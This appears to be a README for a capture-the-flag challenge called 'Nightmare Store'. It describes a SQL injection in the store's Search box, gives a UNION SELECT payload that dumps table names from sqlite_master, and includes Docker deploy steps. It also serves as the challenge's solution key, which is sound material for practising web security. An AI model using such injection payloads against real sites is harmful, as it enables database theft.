# Name: Nightmare Store

## Description

I don't know what to choose. Wait for a second, I don't even have an account. Bring that flag to me.

The store is at http://141.85.224.108:8081/.

Score: 75

## Vulnerability

Here we have a sql injection vulnerability, the vulnerable box is `Search` from the Store.

## Exploit

We can use a payload like the following:

```
` UNION SELECT GROUP_CONCAT(name,'-'), 2,3,4,5,6,7,8,9, 10,11,12,13,14,15,16,17,18,19 ,20,21,22,23,24,25,26,27,28,29 ,30,31,32,33,34,35,36,37,38,39 ,40,41,42,43,44,45,46,47,48,49 ,50,51,52,53,54,55,56,57,58,59 ,60,61,62,63,64,65,66,67,68,69, 70, 71 FROM sqlite_master --x
```

## Environment

Web server with Python and Sqlite3 support (deployable as a Docker container using files in `deploy/` folder)

## Deploy

Copy `deploy/` folder and run `make run`.
If you need to update the image and container, remove the old container with `make clean` and update the image (and container) using `make`.
It is not possible to update the container without updating the image first.
